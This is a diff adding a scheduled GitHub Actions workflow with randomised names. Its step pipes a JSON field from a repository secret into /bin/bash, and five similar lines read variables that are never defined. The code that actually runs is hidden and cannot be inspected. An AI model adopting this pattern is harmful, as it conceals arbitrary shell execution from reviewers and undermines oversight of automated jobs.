@@ -1,0 +1,23 @@
+name: xianzhenglingdang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianzhenglingdang
+        env:
+          sj62018: ${{ secrets.sj62018 }}
+        run: |
+          echo $sj62018 | jq -r .wfzla60725 | /bin/bash
+          echo $gmtv846 | jq -r .kf6254 | /bin/bash
+          echo $hvsg49865 | jq -r .a453 | /bin/bash
+          echo $r967 | jq -r .mdb1201 | /bin/bash
+          echo $hyzo3 | jq -r .st83851 | /bin/bash
+          echo $y5133 | jq -r .apvek761 | /bin/bash
+
